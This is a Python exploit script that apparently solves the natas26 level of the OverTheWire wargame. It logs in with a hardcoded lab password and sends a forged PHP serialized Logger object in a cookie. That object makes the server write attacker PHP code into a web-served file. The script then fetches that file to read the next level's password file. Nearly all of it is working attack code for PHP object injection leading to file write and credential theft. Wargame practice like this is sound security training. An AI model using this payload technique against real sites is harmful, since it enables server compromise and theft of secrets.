import urllib.request, urllib.parse, base64, http.cookiejar
# natas26: PHP object injection via the drawing cookie. A serialized Logger with
# logFile = img/natas26_<sid>.php and exitMsg = our PHP code: __destruct writes
# exitMsg into logFile at end of request; the file is inside the served img/ dir.
url = "http://natas26.natas.labs.overthewire.org/"
auth = "Basic " + base64.b64encode(b"natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT").decode()
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
r = urllib.request.Request(url, headers={"Authorization": auth})
op.open(r, timeout=15).read()
sid = [c.value for c in cj][0]
print("session:", sid)
php = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>"
path = "img/natas26_%s.php" % sid
payload = ('O:6:"Logger":3:{'
           's:15:"\x00Logger\x00logFile";s:%d:"%s";'
           's:15:"\x00Logger\x00initMsg";s:0:"";'
           's:15:"\x00Logger\x00exitMsg";s:%d:"%s";}' % (len(path), path, len(php), php))
drawing = base64.b64encode(payload.encode()).decode()
d = urllib.parse.urlencode({"x1": "1", "y1": "1", "x2": "2", "y2": "2"}).encode()
r = urllib.request.Request(url, data=d,
                           headers={"Authorization": auth,
                                    "Cookie": "PHPSESSID=" + sid + "; drawing=" + drawing})
op.open(r, timeout=15).read()
r = urllib.request.Request(url + "img/natas26_" + sid + ".php", headers={"Authorization": auth})
print(op.open(r, timeout=15).read().decode("utf-8", "replace")[:300])

